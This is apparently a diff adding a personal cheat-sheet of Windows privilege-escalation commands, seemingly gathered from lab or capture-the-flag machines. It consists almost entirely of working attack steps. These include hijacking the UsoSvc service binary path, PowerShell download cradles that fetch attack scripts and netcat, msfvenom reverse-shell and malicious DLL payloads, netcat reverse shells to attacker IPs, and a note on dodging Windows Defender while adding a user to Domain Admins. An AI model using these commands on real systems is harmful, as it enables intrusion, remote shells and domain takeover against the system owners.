@@ -1,0 +1,78 @@
+service details
+
+wmic service where started=true get name, startname
+=====================================================================
+stop a service
+
+sc stop UsoSvc
+======================================================================
+what can access
+
+whoami /priv
+
+whoami /all
+========================================================================
+with windows powershell file download
+
+IEX (New-Object Net.WebClient).DownloadFile('http://10.10.15.65:5000/Invoke-TokenManipulation.ps1')
+iex (New-Object Net.WebClient).DownloadFile(‘http://10.10.15.60:80/poc.ps1′)
+===========================================================================
+
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.132 lport=2222 -f exe --platform windows reverse.exe
+
+===========================================================================
+
+change usosvc app location
+
+sc config UsoSvc binpath="c:\windows\temp\reverse.exe"
+sc config UsoSvc binpath="c:\temp\nc64.exe"
+=========================================================================
+to start a service
+
+sc start usosvc
+
+=========================================================================
+
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.132/nc64.exe", "$temp\nc.exe")
+
+
+
+
+
+invoke-webrequest -Uri http://10.10.14.52/scsiaccess.exe -OutFile C:\users\melanie\documents\winPEAS.exe
+
+
+Invoke-ServiceAbuse -Name 'UsoSvc' -Command "c:\users\public\a.exe -e cmd.exe"
+
+
+
+c:\users\public\a.exe -e cmd.exe
+================================================================================
+C:\xampp\htdocs\gym\upload\nc64.exe -e cmd.exe 10.10.15.60 4444
+C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.15.60 4444
+
+today
+
+invoke-webrequest -Uri http://10.10.15.65:5000/Invoke-TokenManipulation.ps1 -OutFile Invoke-TokenManipulation.ps1
+
+invoke-webrequest -Uri http://10.10.14.52/reverse.exe -OutFile c:\windows\temp\reverse.exe
+
+Invoke-ServiceAbuse -Name 'UsoSvc' -Command "c:\temp\nc64.exe -e cmd.exe 10.10.15.60 4444"
+
+c:\temp\nc64.exe 10.10.14.132 1111
+=====================================================================================
+Now we need to prepare a DLL that will be supplied as the serverlevelplugindll. We can use msfvenom for this. Given that I saw Windows Defender deployed on the system, I avoided creating any reverse shells to minimize chance of detection. Instead, our DLL will just add the user melanie to the Domain Admins group.
+
+ msfvenom -p windows/x64/exec cmd='net group "domain admins" svc_loanmgr /add /domain' --platform windows -f dll > priv.dll
+ 
+ ==================================================================================
+ 
+ sc.exe stop dns
+ 
+ sc.exe start dns
+============================================================================================================ 
+ NSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+
+==============================================================================================================
+
+Get-Credential
